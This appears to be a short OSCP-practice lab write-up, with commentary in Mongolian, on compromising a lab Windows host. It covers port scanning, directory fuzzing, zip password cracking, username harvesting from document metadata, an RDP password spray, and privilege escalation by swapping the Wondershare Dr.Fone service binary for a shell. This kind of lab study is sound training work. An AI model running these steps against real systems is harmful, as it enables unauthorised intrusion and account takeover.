# OSCP Standalone - 3

## Nmap

```bash
nmap -A -T4 192.168.110.111 -v -p-
```

## Port 80

80 порт дээр тийм ч чухал мэдээлэл байгаагүй.

```bash
feroxbuster -u http://192.168.110.111 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
```

## Port 81

81 порт дээр ч мөн адил чухал мэдээлэл байгаагүй.

```bash
feroxbuster -u http://192.168.110.111:81 -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

## Port 8000 - File Management System

```bash
feroxbuster -u http://192.168.110.111:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

8000 port руу File Management System болон `/admin` байв.

**Login:** admin/admin

### Fuzzing with extensions

```bash
feroxbuster -u http://192.168.110.111:8000 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x sql,php,txt,js,pdf,zip -b "csrftoken=...; sessionid=..."
```

TEMPLATE-PACK-1.zip, RECOVERY.zip файлуудыг татаж аваад нээх гэтэл нууц үг нэхсэн.

### Cracking TEMPLATE-PACK-1.zip

**Zip password:** nabucodonosor

```bash
zip2john TEMPLATE-PACK-1.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

`Template-welcome-letter.doc` файл дотор шинээр орж байгаа ажилтанд зориулсан баримт бичиг байгаа.

**Username:** first.l **Password:** *DocuStoreWelcome!*

### Username Enumeration

```bash
exiftool *.doc | grep Author
```

```bash
./username-anarchy/username-anarchy -i users | tee usernames.txt
```

### Password Spray

```bash
nxc rdp 192.168.110.111 -u usernames.txt -p 'DocuStoreWelcome!'
```

`first.l` формат дагуу нэвтрэх ёстой гэдгийг 2 цаг шаргуу үзсэний эцэст анзаарсан.

## Shell as alex.l

```bash
evil-winrm / rdp
```

## Shell as administrator - Service Binary Hijacking

Downloads дотор `drfone_setup_full4008.exe` — Wondershare Dr.Fone privilege escalation.

Reference: https://www.exploit-db.com/exploits/50755

```bash
icacls "C:\Program Files (x86)\Wondershare\Wondershare dr.fone (CPC)\WsidService.exe"
```

### Binary Hijack

```bash
move "C:\Program Files (x86)\Wondershare\Wondershare dr.fone (CPC)\WsidService.exe" "C:\Program Files (x86)\Wondershare\Wondershare dr.fone (CPC)\WsidService.exe.bak1"

copy C:\Users\alex.l\shell.exe "C:\Program Files (x86)\Wondershare\Wondershare dr.fone (CPC)\WsidService.exe"

shutdown /r /t 0
```

Boom!!!
